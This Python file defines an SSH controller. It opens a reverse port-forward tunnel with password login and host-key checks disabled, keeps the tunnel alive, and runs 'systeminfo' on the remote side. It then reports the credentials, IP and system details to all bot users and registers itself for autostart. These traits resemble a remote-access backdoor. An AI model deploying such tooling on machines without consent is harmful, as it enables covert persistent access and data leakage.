import paramiko
import asyncio

from controllers.botController import send_message_to_all_users
from helpers.autostart import add_to_startup
from helpers.get_used_ports import get_used_ports

from config import server_config as conf


class sshController:
    def __init__(self, username, password, server_ip, port=None, main_file_path=None):
        self.username = username
        self.password = password
        self.server_ip = server_ip
        self.client = None
        self.port = port

        self.credentials_ok = False
        self.main_file_path = main_file_path

    async def create_ssh_tunnel(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # if self.port is None:
        #     range_start = 5000
        #     range_end = 65000
        #     used_ports = get_used_ports(range_start, range_end)
        #     print(f"Used ports: {used_ports}")
        #
        #     for i in range(range_start, range_end):
        #         if i not in used_ports:
        #             try:
        #                 print(f"Connecting to {self.server_ip} on port {i}...")
        #                 self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
        #                                     port=i, timeout=conf['timeout'])
        #                 print(f"Connected    to {self.server_ip} on port {i}")
        #                 self.port = i  # Устанавливаем порт после успешного подключения
        #                 self.credentials_ok = True
        #                 break
        #             except Exception as e:
        #                 print(f"Connection failed on port {i}: {e}")
        #
        # else:
        #     try:
        #         print(f"Connecting to {self.server_ip} on port {self.port}...")
        #         self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
        #                             port=self.port)
        #         print(f"Connected to {self.server_ip} on port {self.port}")
        #         self.credentials_ok = True
        #     except Exception as e:
        #         print(f"Connection failed: {e}")

        range_start = 5000
        range_end = 65000
        used_ports = get_used_ports(range_start, range_end)
        print(f"Used ports: {used_ports}")

        if self.port is None:
            for i in range(range_start, range_end):
                if not i in used_ports:
                    try:
                        print(f"Connecting to {self.server_ip}")
                        self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
                                            timeout=conf['timeout'])
                        print(f"Connected    to {self.server_ip}")
                        self.port = i  # Устанавливаем порт после успешного подключения

                        transport = self.client.get_transport()
                        transport.request_port_forward('', port=self.port)

                        self.credentials_ok = True
                        break
                    except Exception as e:
                        print(f"Connection failed on port {i}: {e}")

        else:
            try:
                print(f"Connecting to {self.server_ip}")
                self.client.connect(hostname=self.server_ip, username=self.username, password=self.password,
                                    timeout=conf['timeout'])
                print(f"Connected to {self.server_ip}")

                transport = self.client.get_transport()
                transport.request_port_forward('', port=self.port)

                self.credentials_ok = True
            except Exception as e:
                print(f"Connection failed: {e}")

    async def monitor_connection(self):
        while True:
            if self.credentials_ok:
                try:
                    stdin, stdout, stderr = self.client.exec_command('echo "ping"')
                    print(stdout.read())
                    await asyncio.sleep(15)  # Интервал проверки

                except Exception as e:
                    print(f"Connection lost: {e}. Reconnecting...")
                    await self.create_ssh_tunnel()
                    continue

    async def get_remote_system_info(self):
        try:
            command = "systeminfo"
            stdin, stdout, stderr = self.client.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()

            if error:
                print(f"Ошибка: {error}")
                return error

            return output

        except Exception as e:
            print(f"Произошла ошибка при подключении или выполнении команды: {e}")

    async def start(self):
        await self.create_ssh_tunnel()
        task = asyncio.create_task(self.monitor_connection())

        system_info = await self.get_remote_system_info()

        if system_info:
            send_message_to_all_users(f"""Подключение успешно установлено!
Пользователь: {self.username}
IP: {self.server_ip}
Порт: {self.port}

Системная информация:
{system_info}

Автозагрузка: 
{add_to_startup(self.main_file_path)}
""")

        await task
